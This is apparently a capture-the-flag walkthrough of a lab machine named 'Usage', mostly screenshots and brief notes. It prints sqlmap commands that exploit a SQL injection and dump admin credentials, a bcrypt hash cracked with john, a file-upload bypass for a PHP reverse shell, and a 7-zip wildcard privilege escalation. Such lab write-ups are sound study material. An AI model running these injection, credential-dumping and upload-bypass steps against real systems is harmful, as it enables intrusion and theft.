**Ping**
![[Pasted image 20240712093738.png]]

**Nmap Scans**
```
mapit 10.10.11.18
```

Nmap Default Scan
![[Pasted image 20240712093836.png]]

Nmap Script and Service Scan
![[Pasted image 20240712093850.png]]

Nmap All Port Scan
![[Pasted image 20240712093906.png]]

On Port 80 http://usage.htb
![[Pasted image 20240712094342.png]]

ffuf Scan
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://usage.htb/FUZZ -t 100 -o ffuf.txt
```
![[Pasted image 20240712094449.png]]

On http://usage.htb/login
![[Pasted image 20240712094543.png]]\

There an another subdomain admin.usage.htb, when we click admin, I have added that to my hosts file
![[Pasted image 20240712095152.png]]

On http://admin.usage.htb
![[Pasted image 20240712095316.png]]

I have registered a new user and logged in
![[Pasted image 20240712095401.png]]

Found Sql Injection point
![[Pasted image 20240712210606.png]]
It is forgot-password form email parameter is vulnerable to sql injection

Request.txt
![[Pasted image 20240712100305.png]]

Running sqlmap for forgot password Post request
```
sqlmap -r request.txt -p email --level 5 --risk 3 --batch --threads 10 --dbs
```
![[Pasted image 20240712100120.png]]

Email parameter is vulnerable
![[Pasted image 20240712100723.png]]

Can't proceed further because the server error was popping again and again
![[Pasted image 20240712101200.png]]

So we have found the database name, will extract info from the database usage_blog
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --flush-session
```
![[Pasted image 20240712223619.png]]

Found admin password hash
```
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```
![[Pasted image 20240712223636.png]]

Will crack it using John
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240712210749.png]]



Will Jump to Initial Foothold......!

Will login into admin account with **admin:whatever1**
![[Pasted image 20240712210945.png]]

This have exploit
![[Pasted image 20240712211224.png]]

Now follow this link to get a reverse shell https://flyd.uk/post/cve-2023-24249/

We have to upload a reverse shell php payload, initial uplao9d it as .jpg to trick the system then intercept the request and add .php at the end of file name and forward it, then you can see the link to access the image (php payload), trigger it and get a reverse shell.

Got reverse shell
![[Pasted image 20240712222811.png]]

**User.txt**
![[Pasted image 20240712223128.png]]


Will Jump to Privilege Escalation.....!


Later I found id_rsa of user dash and got ssh session
![[Pasted image 20240712223921.png]]
```
ssh dash@10.10.11.18 -i id_rsa
```
![[Pasted image 20240712224005.png]]

we can se .monitor.rc in dash home directory
![[Pasted image 20240712224731.png]]

Got a password
![[Pasted image 20240712224810.png]]

Try switch to xander
![[Pasted image 20240712224912.png]]
Cooool...!

sudo privilege
![[Pasted image 20240712230646.png]]

Used the binary
![[Pasted image 20240712230725.png]]

Will use wildcard to elevate our privilege https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
![[Pasted image 20240712231148.png]]
Used this trick to elevate our privilege, because it is using 7-zip to compress the file in the directory /var/www/html

So will do the steps in the directory /var/www/html
![[Pasted image 20240712231314.png]]
![[Pasted image 20240712231343.png]]

Got root's id_rsa, will use this to get ssh session as root
![[Pasted image 20240712231437.png]]

Changed the permissions to id_rsa and got ssh session as root
![[Pasted image 20240712231541.png]]

**Root.txt**
![[Pasted image 20240712231617.png]]



Done with Usage.....:)
